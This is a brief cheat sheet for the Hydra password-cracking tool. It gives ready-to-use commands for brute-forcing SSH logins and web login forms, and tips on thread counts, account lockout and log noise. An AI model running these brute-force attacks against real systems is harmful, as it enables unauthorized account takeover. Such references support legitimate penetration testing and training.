# 🛠️ Hydra

> **Usage:** Fast network logon cracker (Parallelized).

## 📋 Cheat Sheet

### 1. SSH Brute Force
`hydra -l admin -P /usr/share/wordlists/rockyou.txt <target_ip> -t 4 ssh`
* `-l`: Specific username.
* `-P`: Path to password list.
* `-t 4`: Number of parallel threads (keep it low for SSH to avoid lockout).

### 2. Web Form Brute Force (POST)
`hydra -l admin -P list.txt <target_ip> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"`
* **Syntax**: `"[URL]:[Body]:[Condition]"`
* **F=**: Defines the "Failure" message found in the HTML response.

## ⚠️ OpSec Warning
Hydra is extremely "loud." It generates thousands of logs on the target server. Use it only when stealth is not a requirement or after identifying that there is no account lockout policy.
